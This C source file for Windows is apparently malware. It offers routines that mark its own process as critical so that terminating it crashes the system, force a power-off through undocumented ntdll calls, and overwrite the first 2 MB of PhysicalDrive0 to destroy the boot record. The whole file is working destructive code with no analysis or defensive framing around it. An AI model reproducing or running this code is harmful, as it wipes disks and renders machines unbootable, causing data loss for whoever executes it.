#include "YHWH.h"

BOOL
WINAPI
SetProcessYHWH(VOID)
{
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
	NTSTATUS(NTAPI * RtlSetProcessIsCritical)(BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedScb);
	NTSTATUS ntReturnValue;
	ULONG ulBreakOnTermination;
	BOOLEAN bUnused;
	HMODULE hNtDll;

	hNtDll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (PVOID)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");

	if (RtlAdjustPrivilege)
	{
		ntReturnValue = RtlAdjustPrivilege(20, TRUE, FALSE, &bUnused);

		if (ntReturnValue)
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}

	if (RtlSetProcessIsCritical)
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		if (ntReturnValue)
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
YHWHComputer(VOID)
{
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
	NTSTATUS(NTAPI * NtShutdownSystem)(_In_ YHWH_ACTION Action);
	NTSTATUS(NTAPI * NtSetSystemPowerState)(_In_ POWER_ACTION SystemAction, _In_ SYSTEM_POWER_STATE MinSystemState, _In_ ULONG Flags);
	NTSTATUS ntReturnValue;
	HMODULE hNtDll;
	BOOLEAN bUnused;
	BOOL bSuccess;

	hNtDll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	NtSetSystemPowerState = (PVOID)GetProcAddress(hNtDll, "NtSetSystemPowerState");
	NtShutdownSystem = (PVOID)GetProcAddress(hNtDll, "NtShutdownSystem");

	if (RtlAdjustPrivilege)
	{
		ntReturnValue = RtlAdjustPrivilege(19, TRUE, FALSE, &bUnused);

		if (ntReturnValue)
		{
			return FALSE;
		}
	}

	if (NtSetSystemPowerState)
	{
		ntReturnValue = NtSetSystemPowerState(PowerActionShutdownOff, PowerSystemShutdown,
			SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY);

		if (!ntReturnValue)
		{
			return TRUE;
		}
	}

	if (NtShutdownSystem)
	{
		ntReturnValue = NtShutdownSystem(YHWHPowerOff);

		if (!ntReturnValue)
		{
			return TRUE;
		}
	}

	bSuccess = ExitWindowsEx(EWX_POWEROFF, EWX_FORCE);

	if (!bSuccess)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
YHWHBoot(VOID)
{
	HANDLE hDrive;
	DWORD dwWrittenBytes;
	BOOL bSuccess;

	hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDrive == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	bSuccess = WriteFile(hDrive, YHWH_DATA, 2097152, &dwWrittenBytes, NULL);

	if (!bSuccess)
	{
		CloseHandle(hDrive);

		return FALSE;
	}
}